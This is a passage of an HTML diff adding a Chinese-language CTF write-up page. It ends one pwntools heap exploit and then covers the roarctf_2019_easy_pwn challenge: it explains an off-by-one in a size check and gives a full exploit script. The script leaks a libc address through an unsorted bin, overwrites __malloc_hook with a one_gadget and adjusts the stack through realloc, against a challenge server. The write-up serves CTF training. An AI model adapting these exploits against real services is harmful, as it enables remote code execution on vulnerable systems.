+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;choice: &quot;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;choice: &quot;</span><span class="p">,</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="s1">&#39;s&#39;</span><span class="p">)</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span><span class="s1">&#39;k&#39;</span><span class="p">)</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;y&#39;</span><span class="p">)</span><span class="c1">#2</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\xc1</span><span class="s1">&#39;</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span><span class="s1">&#39;yyds&#39;</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">leak_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;leak_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">))</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>
+<span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;malloc_hook:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
+<span class="n">realloc_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__realloc_hook&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;realloc_hook:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">realloc_hook</span><span class="p">))</span>
+<span class="n">realloc</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;realloc&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;realloc:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">realloc</span><span class="p">))</span>
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;skye&#39;</span><span class="p">)</span><span class="c1">#4</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="o">-</span><span class="mi">27</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">)</span><span class="c1">#5</span>
+
+<span class="n">one</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x45226</span><span class="p">,</span><span class="mh">0x4527a</span><span class="p">,</span><span class="mh">0xf0364</span><span class="p">,</span><span class="mh">0xf1207</span><span class="p">]</span>
+<span class="c1"># one = [0x45216,0x4526a,0xf02a4,0xf1147]</span>
+<span class="n">onegadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">one</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;one:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">onegadget</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">11</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">onegadget</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">realloc</span><span class="o">+</span><span class="mi">12</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+<span class="c1"># create(0x10,&#39;skye,yyds&#39;)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;choice: &quot;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x10</span><span class="p">))</span>
+
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h3 id="roarctf_2019_easy_pwn">roarctf_2019_easy_pwn<a class="headerlink" href="#roarctf_2019_easy_pwn" title="Permanent link">&para;</a></h3>
+<h4 id="_5">基本功能<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<p>一个堆管理器，有增删查改功能。所有功能都是基于列表的下标定位操作对象。用 3 个列表维护堆：chunk_inuse、chunk_size、chunk_ptr。</p>
+<h4 id="_6">漏洞<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
+<p>在 edit 功能里面 sub_E26 函数，这个函数用来处理输入长度的，具体代码如下：</p>
+<div class="highlight"><pre><span></span><code><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="n">check_size</span><span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">input_length</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">input_length</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">input_length</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">input_length</span> <span class="o">-</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
+    <span class="n">LODWORD</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">=</span> <span class="n">size</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">//off by one</span>
+  <span class="k">else</span>
+    <span class="nf">LODWORD</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+  <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>当我们要求写入的长度（input_length）大于堆 size 10 个字节时，就可以写入 size + 1 字节，造成 off by one 。</p>
+<h4 id="_7">思路<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
+<p>这条题目和 <code>[V&amp;N2020 公开赛]simpleHeap</code> 思路一样。</p>
+<p>使用 off by one 伪造 chunk size，造成 chunk extend ，再利用 unsorted bin 的特点，泄露出 unsorted bin fd 指针的 libc 地址。</p>
+<p>将上一步中的 chunk extend 剩下在 bin 中的内存申请出来，造成两个指针指向同一个地址，配合 edit 功能实现 houst of spirit ，劫持 __malloc_hook 。</p>
+<p>实际测试后全部 onegadget 因为栈环境问题都无法打通，需要结合 malloc_hook 、 realloc_hook 调整栈环境才能打通。</p>
+<h4 id="exp_1">EXP<a class="headerlink" href="#exp_1" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
+<span class="c1"># p = process(&quot;./roarctf_2019_easy_pwn&quot;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;node3.buuoj.cn&quot;</span><span class="p">,</span><span class="mi">29259</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./roarctf_2019_easy_pwn&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc-2.23.so&quot;</span><span class="p">)</span>
+<span class="c1"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span>
+
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;choice: &quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;choice: &quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0x18</span><span class="p">)</span><span class="c1">#overwrite</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">)</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">)</span><span class="c1">#2</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#protect</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\xe1</span><span class="s1">&#39;</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="mi">10</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;content: &quot;</span><span class="p">)</span>
+<span class="n">leak_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;leak_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">))</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>
+<span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;malloc_hook:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
+<span class="n">realloc</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;realloc&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;realloc:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">realloc</span><span class="p">))</span>
+<span class="n">realloc_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__realloc_hook&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;realloc_hook:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">realloc_hook</span><span class="p">))</span>
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="o">-</span><span class="mi">27</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">)</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">)</span>
+<span class="c1"># one = [0x45226,0x4527a,0xf0364,0xf1207]</span>
+<span class="n">one</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x45216</span><span class="p">,</span><span class="mh">0x4526a</span><span class="p">,</span><span class="mh">0xf02a4</span><span class="p">,</span><span class="mh">0xf1147</span><span class="p">]</span>
+<span class="n">onegadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">one</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;onegadget:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">onegadget</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">11</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">onegadget</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">realloc</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+
+<span class="c1"># gdb.attach(p)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="_8">参考文章<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://bbs.pediy.com/thread-246786.htm">[原创]堆的六种利用手法</a></li>
+<li><a href="https://blog.csdn.net/breeze_cat/article/details/103789081">[pwn]堆：realloc_hook控制栈结构达成onegadget</a></li>
+<li><a href="https://xz.aliyun.com/t/6559">pwn学习系列之Extend the chunk及realloc_hook利用</a></li>
+</ul>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            <span>&copy; 2021</span>by <a href="https://www.mrskye.cn/" target="_blank">SkYe231</a> &nbsp;|&nbsp; <span><a href="http://beian.miit.gov.cn/" target="_blank">粤ICP备20056619号</a></span>
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/vendor.93c04032.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.83e5331e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../../..",
+          features: {'tabs': True},
+          search: Object.assign({
+            worker: "../../../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
